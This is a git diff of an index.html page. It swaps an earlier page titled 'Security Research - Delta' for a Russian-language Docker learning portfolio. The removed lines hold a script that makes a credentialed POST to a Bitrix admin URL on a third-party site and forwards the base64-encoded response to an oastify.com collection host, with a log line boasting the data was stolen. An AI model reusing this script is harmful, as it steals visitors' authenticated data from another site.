@@ -1,31 +1,126 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Security Research - Delta</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Мой Docker сайт | Портфолио</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Дополнительные стили для главной страницы */
+        .hero {
+            background: linear-gradient(135deg, #007acc 0%, #005a9e 100%);
+            color: white;
+            padding: 4rem 2rem;
+            text-align: center;
+            border-radius: 0 0 30px 30px;
+            margin-bottom: 3rem;
+        }
+        
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin: 3rem 0;
+        }
+        
+        .feature-card {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+    </style>
 </head>
 <body>
+    <!-- Навигация -->
+    <nav class="navbar">
+        <div class="container">
+            <a href="/" class="logo">Cerberus Solution </a>
+            <ul class="nav-links">
+                <li><a href="index.html" class="active">Главная</a></li>
+                <li><a href="about.html">Обо мне</a></li>
+                <li><a href="projects.html">Проекты</a></li>
+                <li><a href="blog.html">Блог</a></li>
+                <li><a href="contact.html">Контакты</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Главный контент -->
+    <main class="container">
+        <section class="hero">
+            <h1>Добро пожаловать на мой сайт!</h1>
+            <p>Изучаю Docker, GitHub Pages и веб-разработку</p>
+            <a href="projects.html" class="btn" style="background: white; color: #007acc; margin-top: 2rem; padding: 1rem 2rem;">
+                Смотреть проекты →
+            </a>
+        </section>
+
+        <div class="features">
+            <div class="feature-card">
+                <h2>🎯 Обо мне</h2>
+                <p>Узнайте больше о моём пути в IT, навыках и целях</p>
+                <a href="about.html" class="btn">Подробнее</a>
+            </div>
+            
+            <div class="feature-card">
+                <h2>🚀 Проекты</h2>
+                <p>Мои учебные проекты и пет-проекты с использованием Docker</p>
+                <a href="projects.html" class="btn">Смотреть</a>
+            </div>
+            
+            <div class="feature-card">
+                <h2>📝 Блог</h2>
+                <p>Заметки об обучении, проблемах и решениях</p>
+                <a href="blog.html" class="btn">Читать</a>
+            </div>
+        </div>
+
+        <section style="text-align: center; padding: 3rem; background: #f8f9fa; border-radius: 15px;">
+            <h2>Технологии которые я изучаю:</h2>
+            <div style="display: flex; justify-content: center; gap: 1rem; margin-top: 2rem; flex-wrap: wrap;">
+                <span style="background: #e3f2fd; padding: 0.5rem 1rem; border-radius: 20px;">HTML/CSS</span>
+                <span style="background: #e3f2fd; padding: 0.5rem 1rem; border-radius: 20px;">JavaScript</span>
+                <span style="background: #e3f2fd; padding: 0.5rem 1rem; border-radius: 20px;">Git</span>
+                <span style="background: #e3f2fd; padding: 0.5rem 1rem; border-radius: 20px;">Docker</span>
+                <span style="background: #e3f2fd; padding: 0.5rem 1rem; border-radius: 20px;">GitHub Pages</span>
+            </div>
+        </section>
+    </main>
+
+    
+    <!-- Футер -->
+    <footer>
+        <div class="container">
+            <p>© 2026 Мой Docker проект. Изучаю веб-разработку и DevOps.</p>
+            <div class="social-links">
+                <a href="https://github.com/cerberussolution" target="_blank">GitHub</a> |
+                <a href="mailto:example@email.com">Email</a>
+            </div>
+            <p class="small">Версия: 1.1.0 | Обновлено: <span id="currentDate"></span></p>
+        </div>
+    </footer>
+
     <script>
-        const target = 'https://xn----utbcjbgv0e.com.ua/bitrix/admin/index.php';
+        // Добавляем текущую дату
+        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('ru-RU');
         
-        fetch(target, {
-            method: 'POST',
-            credentials: 'include', 
-        })
-        .then(response => response.text())
-        .then(data => {
-            
-            console.log('Данные успешно похищены:');
-            console.log(data.substring(0, 500)); 
-            
-            
-            fetch('https://5tzcs9gzzkd6knges1tef3swyn4es9gy.oastify.com', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: btoa(data.substring(0, 1000)) // Кодируем в base64 для надежности
-            });
-        })
-        .catch(err => console.error('Ошибка доступа:', err));
+        // Подсветка активной ссылки
+        document.querySelectorAll('.nav-links a').forEach(link => {
+            if (link.href === window.location.href) {
+                link.classList.add('active');
+            }
+        });
     </script>
-    <h1>System Analysis in progress...</h1>
 </body>
 </html>
